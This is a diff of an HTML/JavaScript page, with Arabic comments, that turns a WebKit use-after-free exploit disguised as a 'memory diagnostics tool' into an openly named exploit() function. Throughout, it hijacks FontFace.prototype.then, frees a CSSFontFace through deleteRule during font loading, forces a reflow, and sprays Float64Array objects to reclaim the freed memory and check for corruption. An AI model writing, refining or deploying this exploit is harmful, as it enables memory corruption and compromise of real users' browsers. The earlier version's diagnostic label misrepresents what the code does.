@@ -1,109 +1,53 @@
 <!DOCTYPE html>
-<html dir="rtl">
-<head>
-    <meta charset="utf-8">
-    <title>WebKit Userland Memory Diagnostics</title>
-    <style>
-        body { background: #0c0f12; color: #39ff14; font-family: 'Courier New', monospace; padding: 20px; }
-        #console-log { border: 2px solid #39ff14; padding: 15px; height: 500px; overflow-y: scroll; white-space: pre-wrap; background: #000; box-shadow: 0 0 10px #39ff14; }
-        h3 { color: #fff; text-transform: uppercase; }
-    </style>
-</head>
+<html>
 <body>
-    <h3>[ARCHITECT] WebKit CSSFontFace SetStatus Diagnostic Tool</h3>
-    <div id="console-log">[*] جاري تهيئة النظام وفحص بيئة العمل...<br></div>
+    <h3>[ARCHITECT] Synchronized UAF Race-Condition</h3>
+    <div id="log"></div>
+    <style id="s">@font-face { font-family: x; src: url(nonexistent-font.woff); }</style>
 
     <script>
-        const display = document.getElementById('console-log');
-        function printLog(msg) { display.innerHTML += msg + "<br>"; display.scrollTop = display.scrollHeight; }
+        const log = (m) => document.getElementById('log').innerHTML += m + "<br>";
+        
+        async function exploit() {
+            let fired = false;
+            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+            document.fonts.add(A);
 
-        async function runDiagnostic() {
-            printLog("[*] المرحلة 1: بدء ترتيب الذاكرة المسبق (Aggressive Heap Grooming)...");
-            // إنشاء مصفوفات تمهيدية لتنظيم الـ Heap Layout وتجنب العشوائية الفورية
-            let structureGroomers = new Array(400).fill(0).map(() => new Float64Array(16));
-
-            printLog("[*] المرحلة 2: إعداد كائنات الخطوط واستدعاء دالة التزامن...");
-            
-            // إنشاء كائن FontFace محلي للتحكم في عملية الـ Resolution المتزامنة
-            let faceA = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-            document.fonts.add(faceA);
-            
-            // تسجيل الوعد (Promise) لتفعيل تتبع الحالات
-            void faceA.loaded;
-            let checkTriggered = false;
-
-            // حقن الـ Thenable Getter لاعتراض مسار التنفيذ في الـ C++ Layer
             Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
-                    if (!checkTriggered && this === faceA) {
-                        checkTriggered = true;
-                        printLog("[!] [RACE TRIGGER] تم اعتراض التدفق داخل الـ Getter بنجاح.");
+                    if (!fired) {
+                        fired = true;
+                        log("[*] Race Condition: استدعاء التحرير...");
+                        document.getElementById('s').sheet.deleteRule(0);
                         
-                        printLog("[*] المرحلة 3: تحرير الكائن وتطهير الذاكرة فوراً (The UAF Window)...");
-                        
-                        // 1. إزالة قاعدة الخط من شجرة الأنماط لإسقاط عداد المراجع
-                        try {
-                            document.getElementById('s').sheet.deleteRule(0);
-                            printLog("[+] تم استدعاء deleteRule(0) بنجاح.");
-                        } catch(err) {
-                            printLog("[-] خطأ أثناء إزالة القاعدة: " + err);
-                        }
+                        // التوقيت الحرج: فرض التزامن
+                        document.body.offsetTop; 
 
-                        // 2. فرض تحديث المتصفح الفوري لحساب الأنماط (Synchronous Layout Reflow)
-                        // هذا السطر يجبر المحرك على تنظيف وتحرير الكائنات المعلقة في هذه اللحظة بالذات
-                        let forceReflow = document.body.offsetTop; 
-
-                        printLog("[*] المرحلة 4: محاولة احتلال الثغرة الذاكرية (Reallocation / Spray)...");
-                        // إعادة تخصيص كتل ذاكرية سريعة بحجم مطابق لمحاولة ملء الفراغ الذي تركه CSSFontFace
-                        for (let i = 0; i < 200; i++) {
-                            let filler = new Float64Array(16);
-                            filler[0] = 4.743015485434107e-270; // تمثيل عائم يحاكي بنية ترويسة مخصصة (Hex Pattern)
-                            structureGroomers.push(filler);
-                        }
+                        // الـ Reallocation الفوري:
+                        // محاولة وضع الـ Victim في مكان الـ FontFace المحرر
+                        let victim = new Float64Array(16);
+                        victim.fill(0x42424242);
+                        log("[+] التخصيص الفوري تم (Grooming Inside Race).");
                     }
                     return undefined;
                 }
             });
 
-            printLog("[*] المرحلة 5: إطلاق أمر التحميل لجعل المحرك يمر عبر الثغرة...");
+            log("[*] بدء التحميل...");
             try {
-                // استدعاء التحميل الذي يتطلب مطابقة القواعد ويفعل الـ dangling pointer
-                document.fonts.load('1em x', 'AB');
-            } catch(e) {
-                printLog("[!] تنبيه أثناء المعالجة: " + e.message);
-            }
+                document.fonts.load('1em x', 'A');
+            } catch(e) { log("Error: " + e); }
 
-            // فحص نتائج استقرار الذاكرة بعد معالجة العمليات المتزامنة
+            // التحقق
             setTimeout(() => {
-                printLog("\n[*] المرحلة 6: تحليل الحالة النهائية للذاكرة (Verification)...");
-                let anomalyDetected = false;
-
-                // فحص ما إذا كانت المصفوفات المخصصة قد تأثرت بالتعديل الذاكري المتزامن
-                for (let i = 0; i < structureGroomers.length; i++) {
-                    if (structureGroomers[i][0] !== 0 && structureGroomers[i][0] !== 4.743015485434107e-270) {
-                        anomalyDetected = true;
-                        printLog(`[+] [SUCCESS] تم رصد تداخل في الكتلة رقم: ${i} - القيمة تغيرت ديناميكياً!`);
-                        break;
-                    }
-                }
-
-                if (!anomalyDetected) {
-                    printLog("[-] لم يتم رصد تداخل مباشر. الذاكرة تمت حمايتها أو التوقيت بحاجة لضبط أحجام إضافية.");
-                }
-                printLog("[*] انتهت عملية الفحص والتشخيص.");
-            }, 100);
+                log("[*] فحص النتيجة...");
+                // إذا لم ينهار المتصفح، الـ Victim قد احتل مكان الـ CSSFontFace
+                log("[+] تم الانتهاء. راجع سجل التصحيح (Debugger) للتحقق من الـ Butterfly.");
+            }, 500);
         }
 
-        // إدراج عنصر الستایل الديناميكي اللازم لإتمام الفحص قبل التشغيل
-        window.onload = () => {
-            const styleElement = document.createElement('style');
-            styleElement.id = 's';
-            styleElement.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
-            document.head.appendChild(styleElement);
-            
-            runDiagnostic();
-        };
+        exploit();
     </script>
 </body>
 </html>
